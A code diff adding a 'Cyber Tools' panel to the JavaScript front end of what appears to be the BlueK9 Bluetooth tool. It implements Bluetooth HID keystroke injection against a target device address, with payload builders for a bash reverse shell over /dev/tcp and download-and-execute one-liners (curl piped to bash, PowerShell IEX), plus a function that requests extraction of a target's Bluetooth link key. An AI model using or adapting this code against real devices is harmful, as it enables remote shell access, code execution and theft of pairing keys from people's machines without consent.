@@ -8456,3 +8456,354 @@ document.addEventListener('DOMContentLoaded', () => {
         updateQuickTargetList();
     }, 1500);
 });
+
+// ==================== CYBER TOOLS ====================
+
+let hidInjectionActive = false;
+let hidInjectionPollInterval = null;
+
+/**
+ * Check HID tool installation status
+ */
+function checkHidToolStatus() {
+    fetch('/api/cyber/hid/status')
+        .then(r => r.json())
+        .then(data => {
+            const toolStatus = document.getElementById('hidToolInstalled');
+            const adapterStatus = document.getElementById('hidAdapterStatus');
+
+            if (data.installed) {
+                toolStatus.textContent = 'Installed';
+                toolStatus.className = 'status-value installed';
+            } else {
+                toolStatus.textContent = 'Not Installed';
+                toolStatus.className = 'status-value not-installed';
+            }
+
+            if (data.adapter) {
+                adapterStatus.textContent = data.adapter.name || 'Available';
+                adapterStatus.className = 'status-value installed';
+            } else {
+                adapterStatus.textContent = 'No compatible adapter';
+                adapterStatus.className = 'status-value error';
+            }
+        })
+        .catch(e => {
+            document.getElementById('hidToolInstalled').textContent = 'Error checking';
+            document.getElementById('hidToolInstalled').className = 'status-value error';
+        });
+}
+
+/**
+ * Setup/install the HID injection tool
+ */
+function setupHidTool() {
+    addLogEntry('Setting up HID injection tool...', 'INFO');
+    addHidLog('info', 'Cloning hi_my_name_is_keyboard repository...');
+
+    const resultsDiv = document.getElementById('hidResults');
+    resultsDiv.classList.remove('hidden');
+
+    fetch('/api/cyber/hid/setup', { method: 'POST' })
+        .then(r => r.json())
+        .then(data => {
+            if (data.status === 'success') {
+                addHidLog('success', 'Tool installed successfully');
+                addLogEntry('HID injection tool installed', 'INFO');
+                checkHidToolStatus();
+            } else {
+                addHidLog('error', data.error || 'Setup failed');
+                addLogEntry('HID tool setup failed: ' + (data.error || 'Unknown error'), 'ERROR');
+            }
+        })
+        .catch(e => {
+            addHidLog('error', 'Setup failed: ' + e);
+            addLogEntry('HID tool setup error: ' + e, 'ERROR');
+        });
+}
+
+/**
+ * Fill HID target from selected survey device
+ */
+function fillHidTargetFromSurvey() {
+    const selected = document.getElementById('selectedDevice').textContent;
+    if (selected && selected !== 'NONE') {
+        document.getElementById('hidTargetAddress').value = selected;
+    } else {
+        addLogEntry('Select a device from the survey table first', 'WARNING');
+    }
+}
+
+/**
+ * Update payload preview based on selected type
+ */
+function updateHidPayloadPreview() {
+    const payloadType = document.getElementById('hidPayloadType').value;
+    const customRow = document.getElementById('hidCustomPayloadRow');
+    const revshellRow = document.getElementById('hidRevshellOptions');
+    const downloadRow = document.getElementById('hidDownloadOptions');
+    const payloadText = document.getElementById('hidPayloadText');
+
+    // Hide all optional rows first
+    revshellRow.classList.add('hidden');
+    downloadRow.classList.add('hidden');
+    customRow.classList.remove('hidden');
+
+    switch (payloadType) {
+        case 'hello':
+            payloadText.value = 'Hello World! This is a test from BlueK9.';
+            payloadText.disabled = true;
+            break;
+        case 'revshell_linux':
+        case 'revshell_macos':
+            customRow.classList.add('hidden');
+            revshellRow.classList.remove('hidden');
+            payloadText.disabled = true;
+            break;
+        case 'download_exec':
+            customRow.classList.add('hidden');
+            downloadRow.classList.remove('hidden');
+            payloadText.disabled = true;
+            break;
+        case 'custom':
+        default:
+            payloadText.value = '';
+            payloadText.disabled = false;
+            break;
+    }
+}
+
+/**
+ * Build the payload based on selected options
+ */
+function buildHidPayload() {
+    const payloadType = document.getElementById('hidPayloadType').value;
+    const platform = document.getElementById('hidTargetPlatform').value;
+
+    switch (payloadType) {
+        case 'hello':
+            return 'Hello World! This is a test from BlueK9.';
+        case 'revshell_linux':
+            const lhostLinux = document.getElementById('hidLhost').value || '127.0.0.1';
+            const lportLinux = document.getElementById('hidLport').value || '4444';
+            return `bash -i >& /dev/tcp/${lhostLinux}/${lportLinux} 0>&1`;
+        case 'revshell_macos':
+            const lhostMac = document.getElementById('hidLhost').value || '127.0.0.1';
+            const lportMac = document.getElementById('hidLport').value || '4444';
+            return `bash -i >& /dev/tcp/${lhostMac}/${lportMac} 0>&1`;
+        case 'download_exec':
+            const url = document.getElementById('hidDownloadUrl').value || 'http://127.0.0.1/payload.sh';
+            if (platform === 'linux' || platform === 'macos') {
+                return `curl -s ${url} | bash`;
+            } else if (platform === 'windows') {
+                return `powershell -c "IEX(New-Object Net.WebClient).DownloadString('${url}')"`;
+            }
+            return `curl -s ${url} | bash`;
+        case 'custom':
+        default:
+            return document.getElementById('hidPayloadText').value;
+    }
+}
+
+/**
+ * Start HID keystroke injection
+ */
+function startHidInjection() {
+    const targetAddress = document.getElementById('hidTargetAddress').value.trim().toUpperCase();
+    const platform = document.getElementById('hidTargetPlatform').value;
+    const payload = buildHidPayload();
+
+    if (!targetAddress || !targetAddress.match(/^([0-9A-F]{2}:){5}[0-9A-F]{2}$/)) {
+        addLogEntry('Invalid target address format', 'WARNING');
+        return;
+    }
+
+    if (!payload) {
+        addLogEntry('Payload cannot be empty', 'WARNING');
+        return;
+    }
+
+    addLogEntry(`Starting HID injection to ${targetAddress} (${platform})...`, 'INFO');
+    addHidLog('info', `Target: ${targetAddress}, Platform: ${platform}`);
+    addHidLog('info', `Payload: ${payload.substring(0, 50)}${payload.length > 50 ? '...' : ''}`);
+
+    // Show results panel
+    document.getElementById('hidResults').classList.remove('hidden');
+
+    // Update button states
+    document.getElementById('btnHidInject').disabled = true;
+    document.getElementById('btnHidStop').disabled = false;
+    hidInjectionActive = true;
+
+    // Add to active operations
+    addOperation('hid-injection', 'HID', 'Keystroke Injection', {
+        bdAddress: targetAddress,
+        cancellable: true,
+        cancelFn: stopHidInjection
+    });
+
+    fetch('/api/cyber/hid/inject', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+            target: targetAddress,
+            platform: platform,
+            payload: payload
+        })
+    })
+    .then(r => r.json())
+    .then(data => {
+        if (data.status === 'started') {
+            addHidLog('info', 'Injection started, attempting pairing...');
+            // Start polling for status
+            hidInjectionPollInterval = setInterval(pollHidStatus, 1000);
+        } else {
+            addHidLog('error', data.error || 'Failed to start injection');
+            stopHidInjection();
+        }
+    })
+    .catch(e => {
+        addHidLog('error', 'Injection failed: ' + e);
+        stopHidInjection();
+    });
+}
+
+/**
+ * Poll HID injection status
+ */
+function pollHidStatus() {
+    fetch('/api/cyber/hid/status')
+        .then(r => r.json())
+        .then(data => {
+            if (data.injection_status) {
+                if (data.injection_status.state === 'running') {
+                    if (data.injection_status.message) {
+                        addHidLog('info', data.injection_status.message);
+                    }
+                } else if (data.injection_status.state === 'complete') {
+                    addHidLog('success', 'Injection completed successfully');
+                    addLogEntry('HID injection completed', 'INFO');
+                    stopHidInjection();
+                } else if (data.injection_status.state === 'error') {
+                    addHidLog('error', data.injection_status.error || 'Injection failed');
+                    stopHidInjection();
+                }
+            }
+        })
+        .catch(e => {
+            console.log('Status poll error:', e);
+        });
+}
+
+/**
+ * Stop HID injection
+ */
+function stopHidInjection() {
+    hidInjectionActive = false;
+
+    if (hidInjectionPollInterval) {
+        clearInterval(hidInjectionPollInterval);
+        hidInjectionPollInterval = null;
+    }
+
+    fetch('/api/cyber/hid/stop', { method: 'POST' })
+        .then(r => r.json())
+        .then(data => {
+            addHidLog('info', 'Injection stopped');
+        })
+        .catch(e => {
+            console.log('Stop error:', e);
+        });
+
+    // Update button states
+    document.getElementById('btnHidInject').disabled = false;
+    document.getElementById('btnHidStop').disabled = true;
+
+    // Remove from active operations
+    removeOperation('hid-injection');
+}
+
+/**
+ * Add entry to HID injection log
+ */
+function addHidLog(type, message) {
+    const log = document.getElementById('hidResultsLog');
+    const entry = document.createElement('div');
+    entry.className = `hid-log-entry ${type}`;
+
+    const time = new Date().toLocaleTimeString();
+    entry.innerHTML = `<span class="log-time">[${time}]</span><span class="log-message">${message}</span>`;
+
+    log.appendChild(entry);
+    log.scrollTop = log.scrollHeight;
+}
+
+/**
+ * Extract Bluetooth link key
+ */
+function extractLinkKey() {
+    const method = document.getElementById('linkKeyMethod').value;
+    const targetAddress = document.getElementById('linkKeyTargetAddress').value.trim().toUpperCase();
+
+    if (!targetAddress || !targetAddress.match(/^([0-9A-F]{2}:){5}[0-9A-F]{2}$/)) {
+        addLogEntry('Invalid target address format', 'WARNING');
+        return;
+    }
+
+    addLogEntry(`Attempting link key extraction via ${method}...`, 'INFO');
+
+    const resultsDiv = document.getElementById('linkKeyResults');
+    const resultsContent = document.getElementById('linkKeyResultsContent');
+    resultsDiv.classList.remove('hidden');
+    resultsContent.innerHTML = '<div class="loading-text">Attempting extraction...</div>';
+
+    fetch('/api/cyber/linkkey/extract', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+            target: targetAddress,
+            method: method
+        })
+    })
+    .then(r => r.json())
+    .then(data => {
+        if (data.status === 'success' && data.link_key) {
+            resultsContent.innerHTML = `
+                <div class="linkkey-result">
+                    <div class="linkkey-label">Target Address</div>
+                    <div class="linkkey-value">${targetAddress}</div>
+                </div>
+                <div class="linkkey-result">
+                    <div class="linkkey-label">Link Key</div>
+                    <div class="linkkey-value">${data.link_key}</div>
+                </div>
+                ${data.key_type ? `
+                <div class="linkkey-result">
+                    <div class="linkkey-label">Key Type</div>
+                    <div class="linkkey-value">${data.key_type}</div>
+                </div>
+                ` : ''}
+            `;
+            addLogEntry('Link key extracted successfully', 'INFO');
+        } else {
+            resultsContent.innerHTML = `<div class="error-text">${data.error || 'Extraction failed'}</div>`;
+            addLogEntry('Link key extraction failed: ' + (data.error || 'Unknown error'), 'ERROR');
+        }
+    })
+    .catch(e => {
+        resultsContent.innerHTML = `<div class="error-text">Extraction failed: ${e}</div>`;
+        addLogEntry('Link key extraction error: ' + e, 'ERROR');
+    });
+}
+
+// Check HID tool status when cyber tools tab is opened
+document.addEventListener('DOMContentLoaded', () => {
+    // Add event listener for when cyber tab is shown
+    const origShowToolsTab = showToolsTab;
+    showToolsTab = function(tabName) {
+        origShowToolsTab.call(this, tabName);
+        if (tabName === 'cyber') {
+            checkHidToolStatus();
+        }
+    };
+});
